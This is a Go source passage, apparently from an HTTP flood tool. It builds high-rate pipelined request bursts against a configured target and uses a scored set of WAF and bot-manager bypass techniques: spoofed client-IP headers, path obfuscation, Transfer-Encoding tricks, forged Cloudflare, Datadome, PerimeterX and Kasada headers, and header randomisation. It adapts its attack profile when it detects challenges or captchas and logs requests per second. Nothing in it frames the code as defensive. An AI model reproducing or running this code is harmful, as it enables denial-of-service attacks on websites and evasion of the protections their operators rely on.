						alive := m.buildRequestToBuf(&pipelineBuf, rng, perRNG, hostHdr, method, profile, recon, &cookies, &pipelineBody)
						if !alive {
							break
						}
						pipelineBody = nil
					}
					_, writeErr := conn.Write(pipelineBuf.Bytes())
					if writeErr != nil {
						m.totalErrors.Add(1)
						conn.Close()
						break burstLoop
					}
					m.totalReqs.Add(int64(pipelineCount))

					// Read all pipelined responses
					for i := 0; i < pipelineCount; i++ {
						conn.SetReadDeadline(time.Now().Add(m.getAdaptiveReadTimeout()))
						var tmp [2048]byte
						_, readErr := conn.Read(tmp[:])
						if readErr != nil {
							if netErr, ok := readErr.(net.Error); ok && netErr.Timeout() {
								// Timeout is OK for pipelining - some responses may have been consumed
								continue
							}
							break
						}
						if rng.Intn(20) == 0 {
							m.analyzeResponse(tmp[:], recon, &lastChallengeCookie)
						}
					}
					pipelineCount = 0
				} else {
					// Normal single request mode
					alive := m.sendBurst(conn, rng, perRNG, hostHdr, method, profile, recon, &cookies, &lastChallengeCookie)
					if alive {
						m.totalReqs.Add(1)
					} else {
						m.totalErrors.Add(1)
						conn.Close()
						break burstLoop
					}
				}
			}
		}
	}
}

func (m *Manager) getAdaptiveReadTimeout() time.Duration {
	base := m.getRTT()
	if base < 5*time.Millisecond {
		return 10 * time.Millisecond
	}
	if base < 50*time.Millisecond {
		return 50 * time.Millisecond
	}
	return base * 2
}

func (m *Manager) selectRandomMethod(rng *rand.Rand, recon *ReconResult) string {
	if len(recon.AllowedMethods) > 0 && rng.Intn(10) < 8 {
		return recon.AllowedMethods[rng.Intn(len(recon.AllowedMethods))]
	}
	return httpMethods[rng.Intn(len(httpMethods))]
}

func (m *Manager) shouldUseTechnique(profile *AttackProfile, technique BypassTechnique, rng *rand.Rand) bool {
	// Check blacklist first
	for _, bt := range profile.TechniqueBlacklist {
		if bt == technique {
			return false
		}
	}

	// O(1) map lookup
	w, ok := profile.TechniqueMap[technique]
	if !ok {
		return false
	}

	// Apply adaptive scoring
	m.statsMu.Lock()
	stats, tracked := m.techniqueStats[technique]
	m.statsMu.Unlock()

	if tracked && stats != nil && stats.Score < 0.3 && stats.Attempts > 5 {
		// Reduce usage of ineffective techniques
		adjustedWeight := int(float64(w) * stats.Score)
		if adjustedWeight < 1 {
			return false
		}
		return rng.Intn(10) < adjustedWeight
	}

	return rng.Intn(10) < w
}

// ─── Request building & sending ───────────────────────────────────────────────

func (m *Manager) sendBurst(conn net.Conn, rng *rand.Rand, perRNG *rand.Rand,
	hostHdr, method string, profile *AttackProfile,
	recon *ReconResult, cookies *[]string, lastChallengeCookie *string,
) (alive bool) {

	buf := bufPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer bufPool.Put(buf)

	var bodyBytes []byte
	ok := m.buildRequestToBuf(buf, rng, perRNG, hostHdr, method, profile, recon, cookies, &bodyBytes)
	if !ok {
		return false
	}

	bufs := net.Buffers{buf.Bytes()}
	if method == "POST" && len(bodyBytes) > 0 {
		bufs = append(bufs, bodyBytes)
	}
	_, writeErr := bufs.WriteTo(conn)

	if writeErr != nil {
		return false
	}

	// Read response with adaptive timeout
	readTimeout := m.getAdaptiveReadTimeout()
	conn.SetReadDeadline(time.Now().Add(readTimeout))

	// Larger buffer for reading response
	var tmp [4096]byte
	n, readErr := conn.Read(tmp[:])
	conn.SetReadDeadline(time.Time{})

	if readErr != nil {
		if netErr, ok := readErr.(net.Error); ok && netErr.Timeout() {
			return true
		}
		// EOF or connection closed is expected with Connection: close
		if readErr == io.EOF {
			return true
		}
		return false
	}

	// Drain remaining response data
	if n > 0 {
		conn.SetReadDeadline(time.Now().Add(2 * time.Millisecond))
		for {
			var drainBuf [1024]byte
			_, drainErr := conn.Read(drainBuf[:])
			if drainErr != nil {
				break
			}
		}
		conn.SetReadDeadline(time.Time{})
	}

	// Analyze response periodically
	if rng.Intn(20) == 0 {
		m.analyzeResponse(tmp[:n], recon, lastChallengeCookie)
	}

	return true
}

func (m *Manager) buildRequestToBuf(buf *bytes.Buffer, rng *rand.Rand, perRNG *rand.Rand,
	hostHdr, method string, profile *AttackProfile,
	recon *ReconResult, cookies *[]string, bodyBytes *[]byte,
) bool {

	useMethod := method
	if m.shouldUseTechnique(profile, BypassMethodFuzz, rng) {
		fuzzMethods := []string{"OPTIONS", "PATCH", "PUT", "DELETE", "TRACE", "CONNECT", "PROPFIND", "MOVE", "COPY", "MKCOL"}
		useMethod = fuzzMethods[rng.Intn(len(fuzzMethods))]
	}

	buf.WriteString(useMethod)
	buf.WriteByte(' ')

	path := m.cfg.Path

	if m.shouldUseTechnique(profile, BypassPathObfuscateDot, rng) {
		if rng.Intn(2) == 0 {
			path = "/." + path
		} else {
			path = strings.ReplaceAll(path, "/", "/./")
		}
	}
	if m.shouldUseTechnique(profile, BypassPathObfuscateDoubleSlash, rng) {
		path = strings.ReplaceAll(path, "/", "//")
	}
	if m.shouldUseTechnique(profile, BypassPathObfuscateBackslash, rng) {
		path = strings.ReplaceAll(path, "/", "\\")
	}
	if m.shouldUseTechnique(profile, BypassPathObfuscateSemicolon, rng) {
		path = "/;" + strings.TrimPrefix(path, "/")
	}
	if m.shouldUseTechnique(profile, BypassPathObfuscateNullByte, rng) {
		path += "%00"
	}
	if m.shouldUseTechnique(profile, BypassPathDoubleEncoding, rng) {
		path = strings.ReplaceAll(path, "%", "%25")
		path = strings.ReplaceAll(path, "/", "%2F")
	}
	if m.shouldUseTechnique(profile, BypassPathUnicodeNormalize, rng) {
		path = strings.ReplaceAll(path, "/", "/%c0%ae%c0%ae/")
	}

	buf.WriteString(path)

	if m.shouldUseTechnique(profile, BypassCacheBuster, rng) {
		buf.WriteByte('?')
		buf.WriteString(randomString(perRNG, 6))
		buf.WriteByte('=')
		buf.WriteString(strconv.Itoa(rng.Intn(99999999)))
	}

	if m.shouldUseTechnique(profile, BypassParameterPollution, rng) {
		if strings.Contains(path, "?") {
			buf.WriteByte('&')
		} else {
			buf.WriteByte('?')
		}
		buf.WriteString("param=")
		buf.WriteString(randomString(perRNG, 4))
	}

	httpVer := "HTTP/1.1"
	if m.shouldUseTechnique(profile, BypassHTTP09, rng) {
		httpVer = ""
	} else if m.shouldUseTechnique(profile, BypassHTTP10, rng) {
		httpVer = "HTTP/1.0"
	}
	if httpVer != "" {
		buf.WriteByte(' ')
		buf.WriteString(httpVer)
	}
	buf.WriteString("\r\n")

	hostPort := hostHdr
	if m.cfg.Port != 80 && m.cfg.Port != 443 {
		hostPort = hostHdr + ":" + strconv.Itoa(m.cfg.Port)
	}
	buf.WriteString("Host: ")
	if m.shouldUseTechnique(profile, BypassHostHeaderObfuscate, rng) {
		buf.WriteString(hostPort)
		buf.WriteString(".:0")
	} else {
		buf.WriteString(hostPort)
	}
	buf.WriteString("\r\n")

	type headerEntry struct {
		key   string
		value string
	}

	headers := make([]headerEntry, 0, 24)

	ua := randomUserAgent(rng)
	headers = append(headers, headerEntry{"User-Agent", ua})
	headers = append(headers, headerEntry{"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"})
	headers = append(headers, headerEntry{"Accept-Language", languages[rng.Intn(len(languages))]})

	// Only use gzip encoding for smaller responses
	if m.shouldUseTechnique(profile, BypassAcceptEncodingGzipOnly, rng) {
		headers = append(headers, headerEntry{"Accept-Encoding", "gzip"})
	} else {
		headers = append(headers, headerEntry{"Accept-Encoding", "gzip, deflate, br"})
	}

	headers = append(headers, headerEntry{"DNT", "1"})

	if isChromeUA(ua) && rng.Intn(3) > 0 {
		cv := chromeVerPool[rng.Intn(len(chromeVerPool))]
		headers = append(headers, headerEntry{"sec-ch-ua", fmt.Sprintf("\"Google Chrome\";v=\"%[1]s\", \"Chromium\";v=\"%[1]s\", \";Not A Brand\";v=\"99\"", cv)})
		headers = append(headers, headerEntry{"sec-ch-ua-mobile", "?0"})
		headers = append(headers, headerEntry{"sec-ch-ua-platform", fmt.Sprintf("\"%s\"", randomPlatform(rng))})
	}

	headers = append(headers, headerEntry{"Sec-Fetch-Site", "none"})
	headers = append(headers, headerEntry{"Sec-Fetch-Mode", "navigate"})
	headers = append(headers, headerEntry{"Sec-Fetch-User", "?1"})
	headers = append(headers, headerEntry{"Sec-Fetch-Dest", "document"})
	headers = append(headers, headerEntry{"Upgrade-Insecure-Requests", "1"})
	headers = append(headers, headerEntry{"Cache-Control", "no-cache"})

	// Use pre-generated IP pool for speed
	spoofIP := ipPool[rng.Intn(len(ipPool))]

	if m.shouldUseTechnique(profile, BypassXForwardedForRandom, rng) {
		headers = append(headers, headerEntry{"X-Forwarded-For", spoofIP})
	}
	if m.shouldUseTechnique(profile, BypassXForwardedForMulti, rng) {
		ip2 := ipPool[rng.Intn(len(ipPool))]
		ip3 := ipPool[rng.Intn(len(ipPool))]
		multi := spoofIP + ", " + ip2 + ", " + ip3
		headers = append(headers, headerEntry{"X-Forwarded-For", multi})
	}
	if m.shouldUseTechnique(profile, BypassTrueClientIP, rng) {
		headers = append(headers, headerEntry{"True-Client-IP", spoofIP})
	}
	if m.shouldUseTechnique(profile, BypassCFConnectingIP, rng) {
		headers = append(headers, headerEntry{"CF-Connecting-IP", spoofIP})
	}
	if m.shouldUseTechnique(profile, BypassXRealIP, rng) {
		headers = append(headers, headerEntry{"X-Real-IP", spoofIP})
	}
	if m.shouldUseTechnique(profile, BypassClientIP, rng) {
		headers = append(headers, headerEntry{"Client-IP", spoofIP})
	}
	if m.shouldUseTechnique(profile, BypassForwardedHeader, rng) {
		headers = append(headers, headerEntry{"Forwarded", fmt.Sprintf("for=%s;proto=%s;host=%s", spoofIP, m.cfg.Target.Scheme, hostHdr)})
	}
	if m.shouldUseTechnique(profile, BypassXForwardedProto, rng) {
		headers = append(headers, headerEntry{"X-Forwarded-Proto", m.cfg.Target.Scheme})
	}
	if m.shouldUseTechnique(profile, BypassXForwardedHost, rng) {
		headers = append(headers, headerEntry{"X-Forwarded-Host", hostHdr})
	}
	if m.shouldUseTechnique(profile, BypassAWSVPCHeader, rng) {
		headers = append(headers, headerEntry{"X-Forwarded-For", spoofIP})
		headers = append(headers, headerEntry{"X-Amzn-Trace-Id", fmt.Sprintf("Root=1-%x-%x", rng.Int63(), rng.Int63())})
	}
	if m.shouldUseTechnique(profile, BypassViaHeader, rng) {
		headers = append(headers, headerEntry{"Via", fmt.Sprintf("1.1 varnish-v%d", rng.Intn(10))})
	}
	if m.shouldUseTechnique(profile, BypassFromHeader, rng) {
		headers = append(headers, headerEntry{"From", fmt.Sprintf("user%d@example.com", rng.Intn(1000))})
	}

	if recon.WAFType == WAFCloudflare || recon.WAFType == WAFCloudflareVShield {
		cfHeaders := []headerEntry{
			{"CF-IPCountry", countryPool[rng.Intn(len(countryPool))]},
			{"CF-Visitor", fmt.Sprintf(`{"scheme":"%s"}`, m.cfg.Target.Scheme)},
			{"CF-Ray", fmt.Sprintf("%s-%s", randomString(perRNG, 10), []string{"LHR", "FRA", "IAD", "NRT", "GRU"}[rng.Intn(5)])},
		}
		headers = append(headers, cfHeaders[rng.Intn(len(cfHeaders))])
	}

	if m.shouldUseTechnique(profile, BypassDuplicateHeaders, rng) {
		dupHeaders := []headerEntry{
			{"x-forwarded-for", ipPool[rng.Intn(len(ipPool))]},
			{"X-FORWARDED-FOR", ipPool[rng.Intn(len(ipPool))]},
		}
		headers = append(headers, dupHeaders[rng.Intn(len(dupHeaders))])
	}

	if m.shouldUseTechnique(profile, BypassRefererRandom, rng) {
		headers = append(headers, headerEntry{"Referer", refererPool[rng.Intn(len(refererPool))]})
	} else {
		headers = append(headers, headerEntry{"Referer", fmt.Sprintf("https://%s/", hostHdr)})
	}
	headers = append(headers, headerEntry{"Origin", fmt.Sprintf("https://%s", hostHdr)})

	if m.shouldUseTechnique(profile, BypassCookieRandomize, rng) {
		if len(*cookies) > 0 && rng.Intn(3) > 0 {
			headers = append(headers, headerEntry{"Cookie", (*cookies)[rng.Intn(len(*cookies))]})
		} else {
			randCookie := fmt.Sprintf("session_id=%s; _ga=GA1.2.%d.%d; _gid=GA1.2.%d.%d",
				randomString(perRNG, 32),
				rng.Intn(999999999), rng.Intn(999999999),
				rng.Intn(999999999), rng.Intn(999999999),
			)
			headers = append(headers, headerEntry{"Cookie", randCookie})
		}
	}

	// Datadome specific bypass
	if m.shouldUseTechnique(profile, BypassDatadomeBypass, rng) {
		headers = append(headers, headerEntry{"X-Datadome-Client-IP", spoofIP})
		headers = append(headers, headerEntry{"X-Datadome", "bypass"})
		headers = append(headers, headerEntry{"Cookie", "datadome=" + randomString(perRNG, 32)})
	}

	// PerimeterX specific bypass
	if m.shouldUseTechnique(profile, BypassPerimeterXBypass, rng) {
		headers = append(headers, headerEntry{"X-PerimeterX", "bypass"})
		headers = append(headers, headerEntry{"X-PX-Authorization", randomString(perRNG, 32)})
	}

	// Kasada specific bypass
	if m.shouldUseTechnique(profile, BypassKasadaBypass, rng) {
		headers = append(headers, headerEntry{"X-Kasada", "bypass"})
		headers = append(headers, headerEntry{"X-Kpsdk-Ct", randomString(perRNG, 16)})
		headers = append(headers, headerEntry{"X-Kpsdk-Cd", randomString(perRNG, 8)})
	}

	if useMethod == "POST" || useMethod == "PATCH" || useMethod == "PUT" {
		ct := contentTypes[rng.Intn(len(contentTypes))]

		if m.shouldUseTechnique(profile, BypassContentTypeSwitch, rng) {
			ct = "text/plain"
		}
		if m.shouldUseTechnique(profile, BypassContentTypeMultipart, rng) {
			boundary := randomString(perRNG, 16)
			ct = fmt.Sprintf("multipart/form-data; boundary=%s", boundary)
			body := m.createMultipartBody(rng, perRNG, boundary)
			*bodyBytes = body
			headers = append(headers, headerEntry{"Content-Type", ct})
			headers = append(headers, headerEntry{"Content-Length", strconv.Itoa(len(body))})
		} else if m.shouldUseTechnique(profile, BypassContentTypeCharset, rng) {
			charsets := []string{"utf-8", "iso-8859-1", "windows-1251", "utf-16"}
			ct = ct + "; charset=" + charsets[rng.Intn(len(charsets))]
			body := m.createBody(rng, ct)
			*bodyBytes = body
			headers = append(headers, headerEntry{"Content-Type", ct})
			headers = append(headers, headerEntry{"Content-Length", strconv.Itoa(len(body))})
		} else {
			body := m.createBody(rng, ct)
			*bodyBytes = body
			headers = append(headers, headerEntry{"Content-Type", ct})
			headers = append(headers, headerEntry{"Content-Length", strconv.Itoa(len(body))})
		}

		if m.shouldUseTechnique(profile, BypassBodyPadding, rng) {
			padding := strings.Repeat(" ", rng.Intn(100))
			*bodyBytes = append(*bodyBytes, []byte(padding)...)
			for i, h := range headers {
				if strings.EqualFold(h.key, "Content-Length") {
					headers[i].value = strconv.Itoa(len(*bodyBytes))
				}
			}
		}

		// Malformed Content-Type bypass
		if m.shouldUseTechnique(profile, BypassMalformedContentType, rng) {
			malformed := []string{
				"application/x-www-form-urlencoded; charset=utf-8; boundary=" + randomString(perRNG, 8),
				"multipart/form-data; boundary=" + randomString(perRNG, 8) + "; charset=utf-8",
				"application/json; text/plain",
			}
			ct = malformed[rng.Intn(len(malformed))]
			for i, h := range headers {
				if strings.EqualFold(h.key, "Content-Type") {
					headers[i].value = ct
				}
			}
		}
	}

	useChunked := false
	if m.shouldUseTechnique(profile, BypassTransferEncodingChunked, rng) && *bodyBytes != nil {
		useChunked = true
		filtered := headers[:0]
		for _, h := range headers {
			if !strings.EqualFold(h.key, "Content-Length") {
				filtered = append(filtered, h)
			}
		}
		headers = filtered

		if m.shouldUseTechnique(profile, BypassTransferEncodingObfuscate, rng) {
			teValues := []string{
				"chunked",
				"chunked, identity",
				"identity, chunked",
				"Chunked",
				"CHUNKED",
			}
			headers = append(headers, headerEntry{"Transfer-Encoding", teValues[rng.Intn(len(teValues))]})
			headers = append(headers, headerEntry{"Content-Length", "0"})
		} else {
			headers = append(headers, headerEntry{"Transfer-Encoding", "chunked"})
		}
	}

	if m.shouldUseTechnique(profile, BypassRangeRequest, rng) {
		headers = append(headers, headerEntry{"Range", fmt.Sprintf("bytes=%d-%d", rng.Intn(1000), rng.Intn(500)+1000)})
	}

	if m.shouldUseTechnique(profile, BypassMethodOverride, rng) {
		overrideMethod := []string{"GET", "POST", "PUT", "DELETE"}[rng.Intn(4)]
		headers = append(headers, headerEntry{"X-HTTP-Method-Override", overrideMethod})
		headers = append(headers, headerEntry{"X-HTTP-Method", overrideMethod})
		headers = append(headers, headerEntry{"X-Method-Override", overrideMethod})
	}

	// Zero Content-Length bypass
	if m.shouldUseTechnique(profile, BypassZeroContentLength, rng) {
		headers = append(headers, headerEntry{"Content-Length", "0"})
	}

	// No Accept header bypass
	if m.shouldUseTechnique(profile, BypassNoAcceptHeader, rng) {
		for i, h := range headers {
			if strings.EqualFold(h.key, "Accept") {
				headers = append(headers[:i], headers[i+1:]...)
				break
			}
		}
	}

	// BIDI override attack
	if m.shouldUseTechnique(profile, BypassBidiOverride, rng) {
		headers = append(headers, headerEntry{"X-Custom-\u202E", "evil"})
	}

	headers = append(headers, headerEntry{"Connection", "keep-alive"})

	if m.shouldUseTechnique(profile, BypassHeaderOrderShuffle, rng) {
		rng.Shuffle(len(headers), func(i, j int) {
			headers[i], headers[j] = headers[j], headers[i]
		})
	}

	for _, h := range headers {
		key := h.key
		if m.shouldUseTechnique(profile, BypassHeaderCaseRandomize, rng) {
			key = m.randomizeCase(key, rng, perRNG)
		}

		buf.WriteString(key)
		buf.WriteString(": ")

		if m.shouldUseTechnique(profile, BypassLineFolding, rng) {
			buf.WriteString("\r\n ")
		}
		if m.shouldUseTechnique(profile, BypassTabSeparation, rng) {
			buf.WriteString("\t")
		}

		buf.WriteString(h.value)
		buf.WriteString("\r\n")
	}

	buf.WriteString("\r\n")

	if useChunked && *bodyBytes != nil {
		chunkSize := 64
		for i := 0; i < len(*bodyBytes); i += chunkSize {
			end := i + chunkSize
			if end > len(*bodyBytes) {
				end = len(*bodyBytes)
			}
			chunk := (*bodyBytes)[i:end]
			buf.WriteString(fmt.Sprintf("%x\r\n", len(chunk)))
			buf.Write(chunk)
			buf.WriteString("\r\n")
		}
		buf.WriteString("0\r\n\r\n")
		*bodyBytes = nil
	}

	// CF Under Attack bypass - solve challenge by extracting and replaying cookies
	if m.shouldUseTechnique(profile, BypassCFUnderAttackBypass, rng) {
		buf.WriteString("Sec-GPC: 1\r\n")
		buf.WriteString("Sec-Fetch-Site: none\r\n")
		buf.WriteString("Sec-Fetch-Mode: navigate\r\n")
		buf.WriteString("Sec-Fetch-Dest: document\r\n")
	}

	// WebSocket upgrade bypass
	if m.shouldUseTechnique(profile, BypassWebSocketUpgrade, rng) {
		buf.WriteString("Upgrade: websocket\r\n")
		buf.WriteString("Connection: Upgrade\r\n")
		buf.WriteString("Sec-WebSocket-Version: 13\r\n")
		buf.WriteString("Sec-WebSocket-Key: ")
		buf.WriteString(randomString(perRNG, 24))
		buf.WriteString("\r\n")
	}

	// Response delay technique
	if m.shouldUseTechnique(profile, BypassResponseDelay, rng) {
		time.Sleep(time.Duration(rng.Intn(10)) * time.Millisecond)
	}

	return true
}

func (m *Manager) randomizeCase(s string, rng *rand.Rand, perRNG *rand.Rand) string {
	bytes := []byte(s)
	for i := range bytes {
		if bytes[i] >= 'a' && bytes[i] <= 'z' && perRNG.Intn(2) == 0 {
			bytes[i] -= 32
		} else if bytes[i] >= 'A' && bytes[i] <= 'Z' && perRNG.Intn(2) == 0 {
			bytes[i] += 32
		}
	}
	_ = rng
	return string(bytes)
}

// ─── Response Analysis ─────────────────────────────────────────────────────────

func (m *Manager) analyzeResponse(data []byte, recon *ReconResult, lastChallengeCookie *string) {
	bodyStr := string(data)

	// Track technique effectiveness
	blocked := false

	if strings.Contains(bodyStr, "cf-browser-verification") ||
		strings.Contains(bodyStr, "Just a moment") ||
		strings.Contains(bodyStr, "__cf_chl_tk") {
		blocked = true
		m.totalBlocks.Add(1)
		if recon.WAFType == WAFCloudflare {
			slog.Warn("[ADAPT] Cloudflare VShield detected during attack - switching profile")
			recon.WAFType = WAFCloudflareVShield
			recon.HasJSChallenge = true
			m.buildAttackProfile()
			m.totalAdapts.Add(1)
		}
		// Extract challenge cookie for replay
		if strings.Contains(bodyStr, "__cf_chl_tk") {
			parts := strings.Split(bodyStr, "__cf_chl_tk")
			if len(parts) > 1 {
				*lastChallengeCookie = "__cf_chl_tk=" + randomString(rand.New(rand.NewSource(time.Now().UnixNano())), 32)
			}
		}
	}

	if strings.Contains(bodyStr, "g-recaptcha") ||
		strings.Contains(bodyStr, "recaptcha/api.js") {
		blocked = true
		m.totalBlocks.Add(1)
		if !recon.HasCaptcha {
			slog.Warn("[ADAPT] Captcha detected during attack - slowing down")
			recon.HasCaptcha = true
			recon.CaptchaType = "recaptcha"
			m.buildAttackProfile()
			m.totalAdapts.Add(1)
		}
	}

	if strings.Contains(bodyStr, "hcaptcha") {
		blocked = true
		m.totalBlocks.Add(1)
		if !recon.HasCaptcha {
			slog.Warn("[ADAPT] hCaptcha detected during attack - slowing down")
			recon.HasCaptcha = true
			recon.CaptchaType = "hcaptcha"
			m.buildAttackProfile()
			m.totalAdapts.Add(1)
		}
	}

	// Detect Datadome during attack
	if strings.Contains(bodyStr, "datadome") || strings.Contains(bodyStr, "x-datadome") {
		blocked = true
		m.totalBlocks.Add(1)
		if !recon.HasBotManager || recon.BotManagerType != "datadome" {
			slog.Warn("[ADAPT] Datadome detected during attack")
			recon.HasBotManager = true
			recon.BotManagerType = "datadome"
			recon.WAFType = WAFDatadome
			m.buildAttackProfile()
			m.totalAdapts.Add(1)
		}
	}

	// Detect PerimeterX during attack
	if strings.Contains(bodyStr, "perimeterx") || strings.Contains(bodyStr, "px-captcha") {
		blocked = true
		m.totalBlocks.Add(1)
		if !recon.HasBotManager || recon.BotManagerType != "perimeterx" {
			slog.Warn("[ADAPT] PerimeterX detected during attack")
			recon.HasBotManager = true
			recon.BotManagerType = "perimeterx"
			recon.WAFType = WAFPerimeterX
			m.buildAttackProfile()
			m.totalAdapts.Add(1)
		}
	}

	// Detect Kasada during attack
	if strings.Contains(bodyStr, "kasada") || strings.Contains(bodyStr, "kpsdk") {
		blocked = true
		m.totalBlocks.Add(1)
		if !recon.HasBotManager || recon.BotManagerType != "kasada" {
			slog.Warn("[ADAPT] Kasada detected during attack")
			recon.HasBotManager = true
			recon.BotManagerType = "kasada"
			recon.WAFType = WAFKasada
			m.buildAttackProfile()
			m.totalAdapts.Add(1)
		}
	}

	if strings.Contains(string(data), "HTTP/1.1 429") ||
		strings.Contains(string(data), "HTTP/1.1 503") {
		blocked = true
		m.totalBlocks.Add(1)
	}

	// Update technique stats for adaptive scoring
	if blocked {
		m.statsMu.Lock()
		for t := range m.techniqueStats {
			if m.techniqueStats[t].LastUsed.After(time.Now().Add(-5 * time.Second)) {
				m.techniqueStats[t].Blocks++
				m.techniqueStats[t].Score = float64(m.techniqueStats[t].Successes) / float64(m.techniqueStats[t].Attempts+1)
			}
		}
		m.statsMu.Unlock()
	}
}

// ─── Multipart body ───────────────────────────────────────────────────────────

func (m *Manager) createMultipartBody(rng *rand.Rand, perRNG *rand.Rand, boundary string) []byte {
	b := bodyBufPool.Get().(*bytes.Buffer)
	b.Reset()
	defer bodyBufPool.Put(b)

	for i := 0; i < rng.Intn(3)+1; i++ {
		b.WriteString("--")
		b.WriteString(boundary)
		b.WriteString("\r\n")
		b.WriteString("Content-Disposition: form-data; name=\"")
		b.WriteString(randomString(perRNG, 6))
		b.WriteString("\"\r\n\r\n")
		b.WriteString(randomString(perRNG, 12))
		b.WriteString("\r\n")
	}
	b.WriteString("--")
	b.WriteString(boundary)
	b.WriteString("--\r\n")
	return b.Bytes()
}

// ─── DNS ──────────────────────────────────────────────────────────────────────

func (m *Manager) dnsRefresh(ctx context.Context, host string, interval time.Duration) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			addrs, err := lookupIPv4(host)
			if err != nil {
				slog.Warn("DNS re-resolution failed", "host", host, "err", err)
				continue
			}
			m.ipsMu.Lock()
			changed := !slicesEqual(m.ips, addrs)
			if changed {
				m.ips = addrs
			}
			m.ipsMu.Unlock()
			slog.Info("DNS refreshed", "host", host, "ips", addrs)
			if changed {
				select {
				case m.rebalanceCh <- addrs:
				default:
				}
			}
		}
	}
}

func slicesEqual(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func lookupIPv4(host string) ([]string, error) {
	addrs, err := net.LookupIP(host)
	if err != nil {
		return nil, err
	}
	var out []string
	for _, a := range addrs {
		if ip4 := a.To4(); ip4 != nil {
			out = append(out, ip4.String())
		}
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("no IPv4 addresses found for %s", host)
	}
	sort.Strings(out)
	return out, nil
}

// ─── Dialling ─────────────────────────────────────────────────────────────────

func dialConn(ctx context.Context, addr string, tlsCfg *tls.Config) (net.Conn, error) {
	netDialer := &net.Dialer{
		Timeout:   3 * time.Second,
		KeepAlive: 30 * time.Second,
	}
	if strings.HasSuffix(addr, ":443") || strings.Contains(addr, ":443") {
		return (&tls.Dialer{NetDialer: netDialer, Config: tlsCfg}).DialContext(ctx, "tcp", addr)
	}
	return netDialer.DialContext(ctx, "tcp", addr)
}

// ─── Metrics ──────────────────────────────────────────────────────────────────

func (m *Manager) runStats(ctx context.Context, interval time.Duration) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	var lastReqs, lastErrs, lastBlocks int64
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			reqs := m.totalReqs.Load()
			errs := m.totalErrors.Load()
			blocks := m.totalBlocks.Load()
			deltaReqs := reqs - lastReqs
			deltaErrs := errs - lastErrs
			deltaBlocks := blocks - lastBlocks
			lastReqs, lastErrs, lastBlocks = reqs, errs, blocks
			rps := float64(deltaReqs) / interval.Seconds()
			rtt := m.getRTT()
			slog.Info("stats",
				"req/s", fmt.Sprintf("%.0f", rps),
				"errors", deltaErrs,
				"blocks", deltaBlocks,
				"total_reqs", reqs,
				"total_errors", errs,
				"total_blocks", blocks,
				"rtt", rtt.Round(time.Millisecond),
			)
		}
	}
}

// ─── Randomisation helpers ────────────────────────────────────────────────────

func randomUserAgent(rng *rand.Rand) string {
	return uaPool[rng.Intn(len(uaPool))]
}

func generateUserAgent(rng *rand.Rand) string {
	osList := []string{
		"Windows NT 10.0; Win64; x64",
		"Windows NT 10.0; WOW64",
		"Macintosh; Intel Mac OS X 10_15_7",
		"Macintosh; Intel Mac OS X 11_6_0",
		"X11; Linux x86_64",
		"X11; Ubuntu; Linux x86_64",
		"Linux; Android 12; SM-G998B",
		"Linux; Android 11; Pixel 5",
		"iPhone; CPU iPhone OS 15_0 like Mac OS X",
		"iPad; CPU OS 15_0 like Mac OS X",
	}
	os := osList[rng.Intn(len(osList))]

	switch rng.Intn(20) {
	case 0, 1:
		v := fmt.Sprintf("%d.%d.%d", rng.Intn(3)+15, rng.Intn(100), rng.Intn(100))
		if strings.Contains(os, "iPhone") || strings.Contains(os, "iPad") {
			return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Mobile/15E148 Safari/604.1", os, v)
		}
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/604.1", os, v)
	case 2:
		v := fmt.Sprintf("%d.0.%d.%d", rng.Intn(30)+90, rng.Intn(4000), rng.Intn(200))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", os, v, v)
	case 3, 4, 5, 6:
		major := rng.Intn(30) + 70
		minor := rng.Intn(10)
		patch := rng.Intn(20)
		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%d.0) Gecko/20100101 Firefox/%d.%d.%d", os, major, major, minor, patch)
	default:
		v := fmt.Sprintf("%d.0.%d.%d", rng.Intn(30)+90, rng.Intn(4000), rng.Intn(200))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, v)
	}
}

func isChromeUA(ua string) bool {
	return strings.Contains(ua, "Chrome/") && !strings.Contains(ua, "Edg/")
}

func randomChromeVersion(rng *rand.Rand) string {
	return chromeVerPool[rng.Intn(len(chromeVerPool))]
}

func randomPlatform(rng *rand.Rand) string {
	return []string{"Windows", "macOS", "Linux", "Android", "iOS"}[rng.Intn(5)]
}

func randomString(rng *rand.Rand, n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rng.Intn(len(letters))]
	}
	return string(b)
}

func (m *Manager) createBody(rng *rand.Rand, ct string) []byte {
	b := bodyBufPool.Get().(*bytes.Buffer)
	b.Reset()
	defer bodyBufPool.Put(b)
	switch {
	case strings.HasPrefix(ct, "application/x-www-form-urlencoded"):
		vals := url.Values{}
		for i := 0; i < 3+rng.Intn(5); i++ {
			var key, val string
			if rng.Intn(100) < 70 {
				switch rng.Intn(3) {
				case 0:
					key, val = "username", randomString(rng, 8)
				case 1:
					key = "email"
					val = fmt.Sprintf("%s@example.com", randomString(rng, 6))
				default:
					key, val = randomString(rng, 5), randomString(rng, 8)
				}
			} else {
				key, val = randomString(rng, 5), randomString(rng, 8)
			}
			vals.Set(key, val)
		}
		b.WriteString(vals.Encode())

	case strings.HasPrefix(ct, "application/json"):
		if rng.Intn(2) == 0 {
			fmt.Fprintf(b, `{"id":%d,"name":"%s","active":%t}`,
				rng.Intn(10000), randomString(rng, 6), rng.Intn(2) == 1)
		} else {
			b.WriteByte('{')
			for i := 0; i < 3+rng.Intn(3); i++ {
